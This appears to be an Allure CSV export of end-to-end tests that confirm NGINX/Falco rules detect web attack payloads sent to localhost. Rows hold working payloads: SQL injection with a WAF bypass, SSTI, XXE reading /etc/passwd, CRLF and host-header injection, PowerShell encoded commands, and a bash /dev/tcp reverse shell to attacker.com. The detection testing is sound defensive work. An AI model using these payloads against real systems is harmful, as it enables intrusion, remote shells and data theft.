"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_JINJA_003` |
| **Name** | Jinja2 Lipsum Function Injection |
| **Category** | SSTI |
| **Subcategory** | jinja2 |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{{lipsum(1)}}`
- **Encoded**: `%7B%7Blipsum(1)%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 08:55:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772268926597-9j8p9u pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772268926597-9j8p9u pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:26.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_003-1772268926597-9j8p9u pattern_id=SSTI_JINJA_003 uri=/?q=%7B%7Blipsum(1)%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[628_SSTI_JINJA_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_007` |
| **Name** | Username existence check |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT LOCATE('admin',(SELECT GROUP_CONCAT(username) FROM users)))>0 --`
- **Encoded**: `'%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~72000ms
- **Timestamp**: 08:55:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1772268917178-7cwchw pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1772268917178-7cwchw pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:17.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1772268917178-7cwchw pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[033_SQLI_BLIND_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CL_TE_002` |
| **Name** | CL.TE with CRLF Injection |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | cl_te |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `x
Transfer-Encoding: chunked`
- **Encoded**: `x%0D%0ATransfer-Encoding%3A%20chunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 08:55:51.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CL_TE_002-1772268951096-4p8xu pattern_id=HRS_CL_TE_002 uri=/?q=x%0D%0ATransfer-Encoding%3A%20chunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CL_TE_002-1772268951096-4p8xu pattern_id=HRS_CL_TE_002 uri=/?q=x%0D%0ATransfer-Encoding%3A%20chunked client=127.0.0.1

**Falco Log Entry**:
```
08:55:51.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CL_TE_002-1772268951096-4p8xu pattern_id=HRS_CL_TE_002 uri=/?q=x%0D%0ATransfer-Encoding%3A%20chunked client=127.0.0.1
```","2","test_e2e_with_logs[486_HRS_CL_TE_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SENSITIVE_HTAC_001` |
| **Name** | htaccess access |
| **Category** | OTHER |
| **Subcategory** | htaccess_exposure |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/.htaccess`
- **Encoded**: `%2F.htaccess`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 08:55:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=SENSITIVE_HTAC_001-1772268910118-19sn3 pattern_id=SENSITIVE_HTAC_001 uri=/?q=%2F.htaccess client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=SENSITIVE_HTAC_001-1772268910118-19sn3 pattern_id=SENSITIVE_HTAC_001 uri=/?q=%2F.htaccess client=127.0.0.1

**Falco Log Entry**:
```
08:55:10.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=SENSITIVE_HTAC_001-1772268910118-19sn3 pattern_id=SENSITIVE_HTAC_001 uri=/?q=%2F.htaccess client=127.0.0.1
```","2","test_e2e_with_logs[606_SENSITIVE_HTAC_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_004` |
| **Name** | Class MRO Traversal Attack |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `__class__.__mro__[1].__subclasses__()`
- **Encoded**: `%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 08:55:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt` |
| **Matched Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772268942099-gt7qwm pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772268942099-gt7qwm pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1

**Falco Log Entry**:
```
08:55:42.000000000: Critical [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772268942099-gt7qwm pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1
```","2","test_e2e_with_logs[517_PICKLE_DESER_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_CASE_001` |
| **Name** | Random Case UNION Injection |
| **Category** | SQLI |
| **Subcategory** | case_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `'uNiOn SeLeCt NuLl,VeRsIoN(),NuLl--`
- **Encoded**: `'uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 08:55:39.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1772268939728-qyjp07 pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1772268939728-qyjp07 pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:39.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_CASE_001-1772268939728-qyjp07 pattern_id=SQLI_CASE_001 uri=/?q='uNiOn%20SeLeCt%20NuLl%2CVeRsIoN()%2CNuLl-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[065_SQLI_CASE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_ENC_003` |
| **Name** | LF-Only Injection (uppercase) |
| **Category** | CRLF |
| **Subcategory** | encoded_crlf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `LF-only uppercase line feed injection`
- **Encoded**: `%0AInjectedHeader%3Atrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 08:56:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1772268967109-jmmtcr pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1772268967109-jmmtcr pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1

**Falco Log Entry**:
```
08:56:07.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_003-1772268967109-jmmtcr pattern_id=CRLF_ENC_003 uri=/?q=%0AInjectedHeader%3Atrue client=127.0.0.1
```","1","test_e2e_with_logs[552_CRLF_ENC_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_PROTO_002` |
| **Name** | JavaScript scheme redirect |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | javascript_scheme |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `url=javascript:alert(1)`
- **Encoded**: `url%3Djavascript%3Aalert%281%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~11000ms
- **Timestamp**: 08:56:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_002-1772268978100-k0kszc pattern_id=REDIR_PROTO_002 uri=/?q=url%3Djavascript%3Aalert%281%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_002-1772268978100-k0kszc pattern_id=REDIR_PROTO_002 uri=/?q=url%3Djavascript%3Aalert%281%29 client=127.0.0.1

**Falco Log Entry**:
```
08:56:18.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_PROTO_002-1772268978100-k0kszc pattern_id=REDIR_PROTO_002 uri=/?q=url%3Djavascript%3Aalert%281%29 client=127.0.0.1
```","2","test_e2e_with_logs[711_REDIR_PROTO_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_CRLF_001` |
| **Name** | CRLF Host injection |
| **Category** | HOST_HEADER |
| **Subcategory** | crlf_host |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\r\nHost: evil.com`
- **Encoded**: `%0d%0aHost%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 08:56:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_CRLF_001-1772268967600-fvov5f pattern_id=HHI_CRLF_001 uri=/?q=%0d%0aHost%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_CRLF_001-1772268967600-fvov5f pattern_id=HHI_CRLF_001 uri=/?q=%0d%0aHost%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
08:56:07.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_CRLF_001-1772268967600-fvov5f pattern_id=HHI_CRLF_001 uri=/?q=%0d%0aHost%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[502_HHI_CRLF_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_004` |
| **Name** | Bash TCP shell via exec |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done`
- **Encoded**: `%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 08:55:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772268932179-zz3cq7 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772268932179-zz3cq7 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1

**Falco Log Entry**:
```
08:55:32.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772268932179-zz3cq7 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1
```","2","test_e2e_with_logs[327_CMD_BASH_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_001` |
| **Name** | XXE external entity file disclosure |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!DOCTYPE test [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>`
- **Encoded**: `%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 08:55:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=XXE_ENTITY_001-1772268910594-ppcl7j pattern_id=XXE_ENTITY_001 uri=/?q=%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=XXE_ENTITY_001-1772268910594-ppcl7j pattern_id=XXE_ENTITY_001 uri=/?q=%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:10.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=XXE_ENTITY_001-1772268910594-ppcl7j pattern_id=XXE_ENTITY_001 uri=/?q=%3C!DOCTYPE%20test%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[564_XXE_ENTITY_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_001` |
| **Name** | MySQL version comment WAF bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/*!50000 UNION*/ /*!50000 SELECT*/ version(),NULL,NULL --`
- **Encoded**: `%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~92000ms
- **Timestamp**: 08:54:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1772268897634-dbwwu pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1772268897634-dbwwu pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:57.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1772268897634-dbwwu pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[055_SQLI_BYPASS_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_PS_002` |
| **Name** | PowerShell encoded command injection |
| **Category** | CMDINJ |
| **Subcategory** | powershell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;powershell -enc JABjAGwAaQBlAG4AdA`
- **Encoded**: `%3Bpowershell%20-enc%20JABjAGwAaQBlAG4AdA`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 08:55:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_002-1772268942202-s2txj pattern_id=CMDI_PS_002 uri=/?q=%3Bpowershell%20-enc%20JABjAGwAaQBlAG4AdA client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_002-1772268942202-s2txj pattern_id=CMDI_PS_002 uri=/?q=%3Bpowershell%20-enc%20JABjAGwAaQBlAG4AdA client=127.0.0.1

**Falco Log Entry**:
```
08:55:42.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMDI_PS_002-1772268942202-s2txj pattern_id=CMDI_PS_002 uri=/?q=%3Bpowershell%20-enc%20JABjAGwAaQBlAG4AdA client=127.0.0.1
```","2","test_e2e_with_logs[714_CMDI_PS_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
